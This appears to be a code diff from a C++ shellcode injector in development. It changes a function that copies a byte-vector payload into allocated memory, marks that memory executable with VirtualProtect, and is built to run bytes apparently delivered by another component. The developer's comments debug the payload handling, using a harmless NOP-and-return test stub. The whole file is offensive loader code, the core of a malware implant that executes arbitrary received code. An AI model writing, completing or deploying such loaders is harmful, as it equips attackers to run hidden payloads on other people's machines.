@@ -5,7 +5,7 @@
 #include <vector>
 #include <iostream>
 
-int injector(std::vector<uint8_t> payloadVector) {
+int injector(std::vector<uint8_t> payload) {
     void* exec_mem;
     BOOL rv;
     HANDLE th;
@@ -13,8 +13,15 @@ int injector(std::vector<uint8_t> payloadVector) {
 
     //this works - so somethings up with the vector access w/ memory
     std::cout << "[?] Using temp payload of \\x90\\x90\\x90\\xC3 cuz the payload is being dumb" << std::endl;
-    const char* payload = "\x90\x90\x90\xC3";
-    unsigned int payload_len = 4;
+    //const char* payload = "\x90\x90\x90\xC3";
+    //unsigned int payload_len = 4;
+
+    //this still runs so it's eitehr 1. payload from TS was received wrong, or 2. vector ownership is screwed up. 
+    //Can test #2 by moving payload outsid eof this func
+    //theory with 1 is that extra bytes get appended to payload 
+    //std::vector<uint8_t> payload = { 0x90,0x90,0x90,0xc3 };
+    //it is NOT the passing in the vector, so something is weird with the payload it appears.
+    auto payload_len = payload.size();
 
  /*   unsigned char* payload = payloadVector.data();
     unsigned int payload_len = payloadVector.size();*/
@@ -25,7 +32,7 @@ int injector(std::vector<uint8_t> payloadVector) {
         return 1;
     }
 
-    RtlMoveMemory(exec_mem, payload, payload_len);
+    RtlMoveMemory(exec_mem, payload.data(), payload_len);
 
     rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
     if (rv == 0) {
